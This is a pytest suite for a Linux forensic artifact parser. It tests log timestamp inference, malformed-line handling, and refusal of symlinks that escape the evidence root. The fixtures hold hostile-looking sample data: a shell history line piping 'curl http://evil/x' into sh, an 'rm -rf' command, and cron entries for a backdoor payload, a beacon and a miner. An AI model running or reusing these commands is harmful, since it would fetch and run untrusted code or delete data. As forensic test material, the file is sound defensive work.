"""Linux artifacts: hostile lines, honest timestamps, and staying inside the evidence root."""

from __future__ import annotations

import base64
import datetime as dt
import hashlib
import os
import struct
import sys
from pathlib import Path

import pytest

from linux import linux_worker as lw

THIS_YEAR = dt.datetime.now(dt.timezone.utc).year


def _epoch(year, month, day, hour=12):
    return dt.datetime(year, month, day, hour, tzinfo=dt.timezone.utc).timestamp()


def _write(path: Path, text: str, mtime: float | None = None) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(text.encode("utf-8"))
    if mtime is not None:
        os.utime(path, (mtime, mtime))
    return path


def _symlink(link: Path, target: Path | str) -> None:
    link.parent.mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError) as ex:  # Windows without the symlink privilege
        pytest.skip(f"cannot create symlinks here: {ex}")


@pytest.fixture
def root(tmp_path) -> Path:
    r = tmp_path / "evidence"
    (r / "home" / "alice").mkdir(parents=True)
    (r / "root").mkdir()
    return r


# -------------------- auth.log --------------------

def test_yearless_lines_take_their_year_from_the_file_mtime_with_rollover(tmp_path) -> None:
    log = _write(tmp_path / "auth.log", "\n".join([
        "Nov 30 08:00:00 host sshd[1]: Accepted password for alice from 10.0.0.1 port 1 ssh2",
        "Dec 31 23:59:58 host sshd[2]: Accepted password for alice from 10.0.0.2 port 2 ssh2",
        "Jan  1 00:00:05 host sshd[3]: Accepted password for alice from 10.0.0.3 port 3 ssh2",
        "Jan  2 09:15:00 host sshd[4]: Accepted password for alice from 10.0.0.4 port 4 ssh2",
    ]) + "\n", mtime=_epoch(2019, 1, 2))
    result = lw.auth_log({"path": str(log)})
    assert [e["timestamp"] for e in result["entries"]] == [
        "2018-11-30T08:00:00", "2018-12-31T23:59:58", "2019-01-01T00:00:05", "2019-01-02T09:15:00"]
    assert all(e["year_inferred"] is True for e in result["entries"])
    assert result["year_source"] == "file_mtime"
    # Not the year the analysis runs in.
    assert not any(e["timestamp"].startswith(str(THIS_YEAR)) for e in result["entries"])


def test_last_line_later_in_the_year_than_the_mtime_belongs_to_the_previous_year(tmp_path) -> None:
    log = _write(tmp_path / "auth.log", "Dec 30 10:00:00 host sshd[1]: session closed for user bob\n",
                 mtime=_epoch(2020, 3, 1))
    assert lw.auth_log({"path": str(log)})["entries"][0]["timestamp"] == "2019-12-30T10:00:00"


def test_reference_mtime_from_the_caller_overrides_the_file_mtime(tmp_path) -> None:
    # An extracted copy has the extraction time as its mtime; the caller knows better.
    log = _write(tmp_path / "auth.log", "Jun  5 10:00:00 host sshd[1]: session closed for user bob\n")
    result = lw.auth_log({"path": str(log), "reference_mtime": _epoch(2015, 6, 6)})
    assert result["entries"][0]["timestamp"] == "2015-06-05T10:00:00"
    assert result["year_source"] == "reference_mtime"


def test_local_time_is_not_labelled_utc_and_unparseable_time_is_null_never_now(tmp_path) -> None:
    log = _write(tmp_path / "auth.log", "\n".join([
        "Mar  3 04:05:06 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
        "Xyz 99 04:05:06 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
        "Feb 30 04:05:06 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
        "2021-03-04T05:06:07.123456+02:00 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
        "2021-03-04T05:06:07 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
        "2021-13-45T99:99:99+02:00 host sshd[1]: Accepted publickey for carol from 10.1.1.1 port 5 ssh2",
    ]) + "\n", mtime=_epoch(2021, 3, 5))
    rows = lw.auth_log({"path": str(log)})["entries"]
    assert len(rows) == 6, "a line with a bad timestamp is kept"
    classic, bad_month, bad_day, iso_offset, iso_naive, iso_bad = rows

    assert classic["timestamp"] == "2021-03-03T04:05:06"      # no offset: zone unknown
    assert classic["tz_known"] is False and classic["year_inferred"] is True
    for bad in (bad_month, bad_day, iso_bad):
        assert bad["timestamp"] is None
        assert bad["timestamp_raw"]
        assert bad["user"] == "carol"
    assert iso_offset["timestamp"] == "2021-03-04T03:06:07.123456+00:00"
    assert iso_offset["tz_known"] is True and iso_offset["year_inferred"] is False
    assert iso_naive["timestamp"] == "2021-03-04T05:06:07" and iso_naive["tz_known"] is False


@pytest.mark.parametrize("message", [
    "Failed password for ", "Failed password for", "pam_unix(sshd:auth): failure; user=",
    "something user= ", "Connection from ", "weird from", " for  from  user= ", "for user ",
])
def test_messages_ending_in_a_tag_do_not_raise(tmp_path, message) -> None:
    log = _write(tmp_path / "auth.log",
                 f"Jan  5 01:02:03 host sshd[9]: {message}\n"
                 "Jan  5 01:02:04 host sshd[9]: Accepted password for dave from 192.0.2.7 port 22 ssh2\n",
                 mtime=_epoch(2022, 1, 6))
    rows = lw.auth_log({"path": str(log)})["entries"]
    assert len(rows) == 2, "one crafted line must not cost the rest of the file"
    assert rows[0]["user"] is None
    assert rows[1]["user"] == "dave" and rows[1]["remote_host"] == "192.0.2.7"


@pytest.mark.parametrize("message, user, remote", [
    ("Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2", "admin", "203.0.113.9"),
    ("Invalid user oracle from 203.0.113.9 port 4242", "oracle", "203.0.113.9"),
    ("Failed password for root from 203.0.113.9 port 4242 ssh2", "root", "203.0.113.9"),
    ("Accepted publickey for alice from 2001:db8::1 port 50000 ssh2: ED25519 SHA256:abc", "alice", "2001:db8::1"),
    ("pam_unix(sshd:session): session opened for user bob(uid=1000) by (uid=0)", "bob", None),
    ("pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.4  user=root",
     "root", "198.51.100.4"),
    ("Disconnected from invalid user admin 203.0.113.9 port 4242 [preauth]", "admin", "203.0.113.9"),
    ("Connection closed by authenticating user root 203.0.113.9 port 4242 [preauth]", "root", "203.0.113.9"),
    ("Connection closed by 203.0.113.9 port 4242 [preauth]", None, "203.0.113.9"),
    # The user name is attacker-controlled: it must not be able to forge the source address.
    # (The name the client sent really was "x from 192.0.2.66".)
    ("Invalid user x from 192.0.2.66 from 203.0.113.9 port 4242", "x from 192.0.2.66", "203.0.113.9"),
    ("Failed password for invalid user a from 192.0.2.66 port 1 from 203.0.113.9 port 4242 ssh2",
     "a from 192.0.2.66 port 1", "203.0.113.9"),
    # An account that is really called "user" or "invalid", and an empty user name.
    ("Accepted password for user from 203.0.113.9 port 4242 ssh2", "user", "203.0.113.9"),
    ("Failed password for invalid from 203.0.113.9 port 4242 ssh2", "invalid", "203.0.113.9"),
    ("Invalid user  from 203.0.113.9 port 4242", None, "203.0.113.9"),
    ("pam_unix(su:session): session closed for user www-data", "www-data", None),
])
def test_user_and_remote_host_extraction(message, user, remote) -> None:
    assert lw._auth_user(message) == user
    assert lw._auth_remote(message) == remote


def test_auth_log_that_is_a_symlink_out_of_its_directory_is_refused(tmp_path) -> None:
    examiner_file = _write(tmp_path / "examiner" / "auth.log",
                           "Jan  5 01:02:03 workstation sshd[1]: Accepted password for examiner from 10.9.9.9 port 1 ssh2\n")
    link = tmp_path / "evidence" / "var" / "log" / "auth.log"
    _symlink(link, examiner_file)
    result = lw.auth_log({"path": str(link)})
    assert result["entries"] == []
    assert result["refused"] and "outside the evidence root" in result["refused"][0]["reason"]
    # With an explicit root the same rule applies.
    assert lw.auth_log({"path": str(link), "root": str(tmp_path / "evidence")})["entries"] == []


# -------------------- shell history --------------------

def test_absurd_history_timestamp_does_not_fail_history_for_everyone(root) -> None:
    _write(root / "home/alice/.bash_history",
           "#1614834367\nwhoami\n#99999999999999999\ncurl http://evil/x | sh\n#999999999999999999999999999999\nid\nls\n")
    _write(root / "root/.zsh_history", ": 99999999999999999999:0;rm -rf /tmp/x\n: 1614834367:0;uptime\n: bogus;echo hi\n")
    (root / "home/bob").mkdir()
    _write(root / "home/bob/.fish_history", "  when: 5\n- cmd: nmap 10.0.0.0/8\n  when: 1e400\n- cmd: ls\n  when: 1614834367\n")
    result = lw.shell_history({"root": str(root)})
    got = {(e["user"], e["command"]): e["timestamp"] for e in result["entries"]}
    assert got == {
        ("alice", "whoami"): "2021-03-04T05:06:07+00:00",
        ("alice", "curl http://evil/x | sh"): None,
        ("alice", "id"): None,
        ("alice", "ls"): None,
        ("root", "rm -rf /tmp/x"): None,
        ("root", "uptime"): "2021-03-04T05:06:07+00:00",
        ("root", "echo hi"): None,
        ("bob", "nmap 10.0.0.0/8"): None,
        ("bob", "ls"): "2021-03-04T05:06:07+00:00",
    }


def test_history_symlinked_to_a_file_outside_the_root_is_not_ingested(root, tmp_path) -> None:
    secret = _write(tmp_path / "examiner_shadow", "root:$6$examiner-own-hash:19000:0:99999:7:::\n")
    _symlink(root / "home/alice/.bash_history", secret)
    _write(root / "home/alice/.zsh_history", ": 1614834367:0;real command\n")
    result = lw.shell_history({"root": str(root)})
    assert [e["command"] for e in result["entries"]] == ["real command"]
    assert not any("examiner-own-hash" in e["command"] for e in result["entries"])
    assert [r["reason"] for r in result["refused"]] == ["symlink resolves outside the evidence root"]


def test_symlink_that_stays_inside_the_root_is_followed(root) -> None:
    _write(root / "home/alice/real_history", "echo inside\n")
    _symlink(root / "home/alice/.bash_history", Path("real_history"))
    result = lw.shell_history({"root": str(root)})
    assert [e["command"] for e in result["entries"]] == ["echo inside"]
    assert result["refused"] == []


def test_home_directory_symlinked_out_of_the_root_is_not_walked(root, tmp_path) -> None:
    outside_home = tmp_path / "examiner_home"
    _write(outside_home / ".bash_history", "examiner typed this\n")
    _symlink(root / "home/mallory", outside_home)
    result = lw.shell_history({"root": str(root)})
    assert result["entries"] == []
    assert any("mallory" in r["path"] for r in result["refused"])


@pytest.mark.skipif(sys.platform == "win32", reason="needs a character device")
def test_history_symlinked_to_dev_zero_does_not_hang(root) -> None:
    _symlink(root / "home/alice/.bash_history", "/dev/zero")
    result = lw.shell_history({"root": str(root)})
    assert result["entries"] == []
    assert result["refused"]


def test_reads_are_capped(root, monkeypatch) -> None:
    monkeypatch.setattr(lw, "MAX_TEXT_BYTES", 64)
    ev = lw._Evidence(root)
    big = _write(root / "home/alice/.bash_history", "x" * 10_000)
    assert len(ev.read_bytes(big, lw.MAX_TEXT_BYTES)) == 64
    assert ev.truncated == [str(big)]

    log = _write(root / "var/log/big.log", "line\n" * 1000)
    ev = lw._Evidence(root)
    lines = list(ev.iter_lines(log, limit=50))
    assert lines == ["line"] * 10
    assert ev.truncated == [str(log)]

    # A "line" with no newline at all is cut, not accumulated.
    monkeypatch.setattr(lw, "MAX_LINE_BYTES", 16)
    blob = _write(root / "var/log/blob.log", "z" * 1000)
    ev = lw._Evidence(root)
    assert max(len(line) for line in ev.iter_lines(blob, limit=200)) == 16


def test_non_regular_file_is_refused(root) -> None:
    (root / "home/alice/.bash_history").mkdir()
    ev = lw._Evidence(root)
    assert ev.read_text(root / "home/alice/.bash_history") is None
    assert ev.refused[0]["reason"] == "not a regular file"


# -------------------- passwd / packages --------------------

def test_non_numeric_uid_keeps_the_row_and_the_call(root) -> None:
    _write(root / "etc/passwd", "\n".join([
        "root:x:0:0:root:/root:/bin/bash",
        "evil:x:zero:1000::/home/evil:/bin/sh",
        "nouid:x::::/home/nouid:/bin/sh",
        "short:line",
        "alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash",
    ]) + "\n")
    _write(root / "etc/shadow", "root:$6$salt$hash:19000:0:99999:7:::\nalice:!:19000::::::\n")
    result = lw.passwd_shadow({"root": str(root)})
    rows = {e["name"]: e for e in result["entries"]}
    assert list(rows) == ["root", "evil", "nouid", "alice"]
    assert rows["root"]["uid"] == 0 and rows["root"]["password_hash"] == "$6$salt$hash"
    assert rows["evil"]["uid"] is None and rows["evil"]["uid_raw"] == "zero" and rows["evil"]["gid"] == 1000
    # An empty UID is unknown. It is not UID 0.
    assert rows["nouid"]["uid"] is None and rows["nouid"]["gid"] is None
    assert rows["alice"]["uid"] == 1000
    assert result["malformed_lines"] == 3


def test_shadow_symlinked_to_the_examiners_own_file_is_not_read(root, tmp_path) -> None:
    _write(root / "etc/passwd", "root:x:0:0:root:/root:/bin/bash\n")
    _symlink(root / "etc/shadow", _write(tmp_path / "host_shadow", "root:$6$examiner$secret:1::::::\n"))
    result = lw.passwd_shadow({"root": str(root)})
    assert result["entries"][0]["password_hash"] is None
    assert len(result["refused"]) == 1


APT_HISTORY = """
Start-Date: 2021-03-04  05:06:07
Commandline: apt-get install -y nmap
Install: nmap:amd64 (7.80+dfsg1-2build1), liblinear4:amd64 (2.3.0+dfsg-3build1, automatic), lua-lpeg:amd64 (1.0.2-1, automatic)
Upgrade: openssl:amd64 (1.1.1f-1ubuntu2, 1.1.1f-1ubuntu2.1), libssl1.1:amd64 (1.1.1f-1ubuntu2, 1.1.1f-1ubuntu2.1)
End-Date: 2021-03-04  05:06:30

Start-Date: not-a-date at-all
Commandline: apt-get remove telnet
Remove: telnet:amd64 (0.17-41.2build1)
End-Date: garbage

Start-Date:
Purge: ftp:amd64 (0.17-34.1)
"""


def test_apt_history_packages_versions_and_malformed_dates(root) -> None:
    _write(root / "var/log/apt/history.log", APT_HISTORY)
    rows = lw.package_logs({"root": str(root)})["entries"]
    assert [(r["action"], r["package"], r["version"]) for r in rows] == [
        ("install", "nmap", "7.80+dfsg1-2build1"),
        ("install", "liblinear4", "2.3.0+dfsg-3build1"),
        ("install", "lua-lpeg", "1.0.2-1"),
        ("upgrade", "openssl", "1.1.1f-1ubuntu2.1"),
        ("upgrade", "libssl1.1", "1.1.1f-1ubuntu2.1"),
        ("remove", "telnet", "0.17-41.2build1"),
        ("purge", "ftp", "0.17-34.1"),
    ]
    # No bogus "packages" made from the inside of a version list.
    assert not any(")" in r["package"] or r["package"] in ("automatic", "1.1.1f-1ubuntu2.1") for r in rows)
    assert rows[3]["previous_version"] == "1.1.1f-1ubuntu2"
    # apt logs local time: emitted without an offset. A malformed date is null.
    assert rows[0]["timestamp"] == "2021-03-04T05:06:07"
    assert rows[5]["timestamp"] is None and rows[6]["timestamp"] is None


# -------------------- cron --------------------

def test_cron_at_schedules_and_system_crontab_users(root) -> None:
    _write(root / "etc/crontab", "\n".join([
        "SHELL=/bin/sh",
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
        "# m h dom mon dow user  command",
        "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly",
        "@reboot www-data /usr/local/bin/beacon --quiet",
        "@daily root /usr/bin/updatedb",
        "*/5 * * * * nobody",
    ]) + "\n")
    _write(root / "etc/cron.d/backdoor", "* * * * * daemon /tmp/.x/payload -c 'a b'\n@hourly backup /opt/b.sh\n")
    _write(root / "var/spool/cron/crontabs/alice",
           "@reboot /home/alice/.cache/miner\n0 3 * * 1 /home/alice/backup.sh --full\n@reboot\nMAILTO=\"\"\n")
    _write(root / "var/spool/cron/bob", "@daily /usr/bin/true\n")
    _write(root / "etc/anacrontab", "SHELL=/bin/sh\n1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n")

    result = lw.cron({"root": str(root)})
    rows = {(Path(e["source"]).as_posix(), e["schedule"]): (e["user"], e["command"]) for e in result["entries"]}
    assert rows == {
        ("system", "17 * * * *"): ("root", "cd / && run-parts --report /etc/cron.hourly"),
        ("system", "@reboot"): ("www-data", "/usr/local/bin/beacon --quiet"),
        ("system", "@daily"): ("root", "/usr/bin/updatedb"),
        ("system", "anacron period=1 delay=5 job=cron.daily"): ("root", "run-parts --report /etc/cron.daily"),
        ("etc/cron.d/backdoor", "* * * * *"): ("daemon", "/tmp/.x/payload -c 'a b'"),
        ("etc/cron.d/backdoor", "@hourly"): ("backup", "/opt/b.sh"),
        ("var/spool/cron/crontabs/alice", "@reboot"): ("alice", "/home/alice/.cache/miner"),
        ("var/spool/cron/crontabs/alice", "0 3 * * 1"): ("alice", "/home/alice/backup.sh --full"),
        ("var/spool/cron/bob", "@daily"): ("bob", "/usr/bin/true"),
    }
    # "*/5 * * * * nobody" (no command) and "@reboot" (nothing to run) are counted, not guessed at.
    assert result["unparsed_lines"] == 2


def test_crontab_symlinked_out_of_the_root_is_refused(root, tmp_path) -> None:
    _symlink(root / "etc/crontab", _write(tmp_path / "host_crontab", "* * * * * root /examiner/own/job\n"))
    result = lw.cron({"root": str(root)})
    assert result["entries"] == []
    assert len(result["refused"]) == 1


# -------------------- ssh --------------------

def _ed25519_blob(seed: bytes) -> tuple[str, str]:
    """(base64 key blob, expected OpenSSH SHA256 fingerprint) for a made-up ed25519 key."""
    key_type = b"ssh-ed25519"
    raw = struct.pack(">I", len(key_type)) + key_type + struct.pack(">I", 32) + hashlib.sha256(seed).digest()
    fingerprint = "SHA256:" + base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    return base64.b64encode(raw).decode(), fingerprint


def test_fingerprint_is_of_the_key_blob_not_of_the_comment() -> None:
    blob, expected = _ed25519_blob(b"k1")
    assert lw._ssh_fp(f"ssh-ed25519 {blob}") == expected
    assert lw._ssh_fp(f"ssh-ed25519 {blob} alice@laptop") == expected
    assert lw._ssh_fp(f"ssh-ed25519 {blob} a comment with several words") == expected
    assert lw._ssh_fp(f'command="/bin/echo hi there",no-pty ssh-ed25519 {blob} deploy key') == expected
    assert lw._ssh_fp(f"|1|c2FsdA==|aGFzaA== ssh-ed25519 {blob}") == expected
    # Same key, different comments: one identity. Different keys, same comment: two.
    other_blob, other_expected = _ed25519_blob(b"k2")
    assert lw._ssh_fp(f"ssh-ed25519 {other_blob} alice@laptop") == other_expected != expected
    assert lw._ssh_fp("ssh-ed25519 not-base64-at-all comment") is None
    assert lw._ssh_fp("") is None


def test_known_fingerprint_vector() -> None:
    # Independently computed: `ssh-keygen -lf` prints SHA256 over the decoded blob.
    blob = "AAAAC3NzaC1lZDI1NTE5AAAAIGtleS1ieXRlcy1rZXktYnl0ZXMta2V5LWJ5dGVzLWtleSE="
    raw = base64.b64decode(blob)
    assert raw[4:15] == b"ssh-ed25519"
    expected = "SHA256:" + base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    assert lw._ssh_fp(f"ssh-ed25519 {blob} root@host") == expected


def test_authorized_keys_and_known_hosts_rows(root) -> None:
    blob1, fp1 = _ed25519_blob(b"a")
    blob2, fp2 = _ed25519_blob(b"b")
    _write(root / "home/alice/.ssh/authorized_keys", "\n".join([
        "# comment",
        f"ssh-ed25519 {blob1} alice@laptop",
        f'from="10.0.0.0/8",command="/usr/bin/rsync --server" ssh-ed25519 {blob2} backup key',
        "garbage line",
    ]) + "\n")
    _write(root / "home/alice/.ssh/known_hosts", "\n".join([
        f"github.com,140.82.112.3 ssh-ed25519 {blob1}",
        f"@cert-authority *.example.com ssh-ed25519 {blob2} ca@example",
        f"|1|c2FsdA==|aGFzaA== ssh-ed25519 {blob2}",
    ]) + "\n")

    keys = lw.ssh_authorized_keys({"root": str(root)})
    assert [(k["key_type"], k["comment"], k["options"], k["fingerprint"]) for k in keys["entries"]] == [
        ("ssh-ed25519", "alice@laptop", None, fp1),
        ("ssh-ed25519", "backup key", 'from="10.0.0.0/8",command="/usr/bin/rsync --server"', fp2),
    ]
    assert keys["unparsed_lines"] == 1

    hosts = lw.ssh_known_hosts({"root": str(root)})
    assert [(h["host"], h["marker"], h["key_type"], h["fingerprint"]) for h in hosts["entries"]] == [
        ("github.com,140.82.112.3", None, "ssh-ed25519", fp1),
        ("*.example.com", "@cert-authority", "ssh-ed25519", fp2),
        ("|1|c2FsdA==|aGFzaA==", None, "ssh-ed25519", fp2),
    ]


# -------------------- systemd / trash --------------------

def test_enabled_unit_is_detected_from_the_link_itself(root) -> None:
    _write(root / "usr/lib/systemd/system/evil.service", "[Service]\nExecStart=/tmp/x\n")
    # As on a real system: an absolute link whose target does not exist on the examiner's machine.
    _symlink(root / "etc/systemd/system/multi-user.target.wants/evil.service",
             "/usr/lib/systemd/system/evil.service-does-not-exist-on-this-host")
    result = lw.systemd_units({"root": str(root)})
    by_path = {Path(e["path"]).relative_to(root).as_posix(): e for e in result["entries"]}
    assert by_path["usr/lib/systemd/system/evil.service"]["enabled"] is True


def test_trash_deletion_time_is_local_time_without_a_zone(root) -> None:
    _write(root / "home/alice/.local/share/Trash/info/secret.txt.trashinfo",
           "[Trash Info]\nPath=/home/alice/secret.txt\nDeletionDate=2021-03-04T05:06:07\n")
    _write(root / "home/alice/.local/share/Trash/files/secret.txt", "12345")
    _write(root / "home/alice/.local/share/Trash/info/gone.trashinfo",
           "[Trash Info]\nPath=/home/alice/gone\nDeletionDate=whenever\n")
    rows = {e["original_path"]: e for e in lw.trash({"root": str(root)})["entries"]}
    assert rows["/home/alice/secret.txt"] == {
        "user": "alice", "original_path": "/home/alice/secret.txt", "size": 5, "deleted_at": "2021-03-04T05:06:07"}
    assert rows["/home/alice/gone"]["deleted_at"] is None and rows["/home/alice/gone"]["size"] is None


# -------------------- journalctl --------------------

def test_journalctl_output_is_streamed_and_capped(tmp_path, monkeypatch) -> None:
    # A stand-in "journalctl" that never stops printing records. Buffering its whole
    # output (the old subprocess.run(capture_output=True)) would never return.
    script = (
        "import sys\n"
        "i = 0\n"
        "while True:\n"
        "    i += 1\n"
        "    sys.stdout.write('{\"__REALTIME_TIMESTAMP\": \"1614834367000000\", \"MESSAGE\": \"m%d\", "
        "\"_SYSTEMD_UNIT\": \"ssh.service\", \"PRIORITY\": \"6\"}\\n' % i)\n"
    )
    monkeypatch.setattr(lw, "_JOURNALCTL", [sys.executable, "-c", script, "--"])
    journal = tmp_path / "journal"
    journal.mkdir()
    result = lw.journalctl({"journal_dir": str(journal), "limit": 250})
    assert len(result["entries"]) == 250
    assert result["truncated_by"] == "entries"
    assert result["entries"][0] == {
        "timestamp": "2021-03-04T05:06:07+00:00", "unit": "ssh.service", "priority": "6", "message": "m1", "user": None}
    assert result["entries"][-1]["message"] == "m250"


def test_journalctl_byte_cap_and_garbage_lines(tmp_path, monkeypatch) -> None:
    script = (
        "import sys\n"
        "sys.stdout.write('not json\\n[1, 2]\\n{\"MESSAGE\": \"ok\", \"__REALTIME_TIMESTAMP\": \"x\"}\\n')\n"
        "while True:\n"
        "    sys.stdout.write('garbage ' * 100 + '\\n')\n"
    )
    monkeypatch.setattr(lw, "_JOURNALCTL", [sys.executable, "-c", script, "--"])
    monkeypatch.setattr(lw, "MAX_JOURNAL_BYTES", 200_000)
    journal = tmp_path / "journal"
    journal.mkdir()
    result = lw.journalctl({"journal_dir": str(journal)})
    assert [e["message"] for e in result["entries"]] == ["ok"]
    assert result["entries"][0]["timestamp"] is None
    assert result["truncated_by"] == "bytes"


def test_journalctl_missing_binary_and_missing_directory(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(lw, "_JOURNALCTL", ["cinder-no-such-journalctl-binary"])
    journal = tmp_path / "journal"
    journal.mkdir()
    assert lw.journalctl({"journal_dir": str(journal)})["todo"]
    assert lw.journalctl({"journal_dir": str(tmp_path / "absent")})["entries"] == []
